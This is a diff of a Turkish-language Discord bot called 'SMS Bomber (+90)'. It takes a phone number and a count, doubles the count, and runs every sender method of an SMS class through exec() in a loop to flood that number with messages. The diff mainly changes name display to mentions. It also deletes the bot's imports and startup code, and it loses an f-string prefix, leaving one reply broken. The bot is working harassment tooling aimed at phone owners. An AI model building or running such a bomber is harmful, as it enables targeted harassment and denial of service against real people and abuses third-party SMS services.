@@ -1,40 +1,6 @@
-import discord
-from time import sleep
-from sms import SendSms
-
-TOKEN = "x"
-
-gif = "https://media.tenor.com/SWiGXYOM8eMAAAAC/russia-soviet.gif"
-saniye = 0
-
-# Kara listedeki numaralar
-blacklist = ["5311234567", "5399876543", "5325554433"]
-
-# İzin verilen rol adı
-allowed_role = "Yetkili"
-
-intents = discord.Intents.all()
-client = discord.Client(intents=intents)
-
-# Botu durdurma fonksiyonu
-async def stop_bot(message):
-    await message.channel.send("Bot durduruluyor...")
-    await client.logout()
-
-# Botu başlatma fonksiyonu
-async def start_bot(message):
-    await message.channel.send("Bot başlatılıyor...")
-    await client.login(TOKEN)
-    await client.connect()
-
-@client.event
-async def on_ready():
-    print('{} Çalışmaya Başladı!'.format(client.user))
-    activity = discord.Activity(type=discord.ActivityType.playing, name="BOMBA ATAR 7/24 SAPLAR")
-    await client.change_presence(activity=activity)
-    
 @client.event
 async def on_message(message):
+    # Botun kendi mesajlarına tepki vermemesi için kontrol ekleyin
     if message.author == client.user:
         return
 
@@ -50,11 +16,11 @@ async def on_message(message):
             if len(telno) == 10:
                 # Eğer numara kara listedeyse gönderme
                 if telno in blacklist:
-                    await message.channel.send(f"Bu numaraya SMS göndermek engellenmiştir.\n{message.author}")
+                    await message.channel.send(f"Bu numaraya SMS göndermek engellenmiştir.\n{message.author.mention}")
                     return
                 
                 adet *= 2  # Kullanıcının girdiği sayının iki katını al
-                embed=discord.Embed(title="SMS Bomber (+90)", description=(f"{adet} adet SMS Gönderiliyor --> {telno}\n{message.author}"), color=0x001eff)
+                embed=discord.Embed(title="SMS Bomber (+90)", description=(f"{adet} adet SMS Gönderiliyor --> {telno}\n{message.author.mention}"), color=0x001eff)
                 embed.set_thumbnail(url=gif)
                 await message.channel.send(embed=embed)
                 sms = SendSms(telno, "")
@@ -67,14 +33,12 @@ async def on_message(message):
                                     break
                                 exec("sms."+attribute+"()")
                                 sleep(saniye)
-                await message.channel.send(telno+" --> "+str(sms.adet)+f" adet SMS gönderildi.\n{message.author}")                        
+                await message.channel.send(telno+" --> "+str(sms.adet)+f" adet SMS gönderildi.\n{message.author.mention}")                        
             else:
-                await message.channel.send(f"Geçerli komut yazınız!\nYardım için '!help' yazınız.\n{message.author}")
+                await message.channel.send(f"Geçerli komut yazınız!\nYardım için '!help' yazınız.\n{message.author.mention}")
         elif "!help" == message.content:
-            await message.channel.send(f"Sms göndermek için komutu aşağıdaki gibi yazınız.\n```!sms 5313313131 10```\n!sms (telefon numarası) (adet)\n{message.author}")
+            await message.channel.send(f"Sms göndermek için komutu aşağıdaki gibi yazınız.\n```!sms 5313313131 10```\n!sms (telefon numarası) (adet)\n{message.author.mention}")
         else:
             pass
     else:
-        await message.channel.send(f"Bu komutu kullanmak için gerekli izne sahip değilsiniz.\n{message.author}")
-  
-client.run(TOKEN)
+        await message.channel.send("Bu komutu kullanmak için gerekli izne sahip değilsiniz.\n{message.author.mention}")
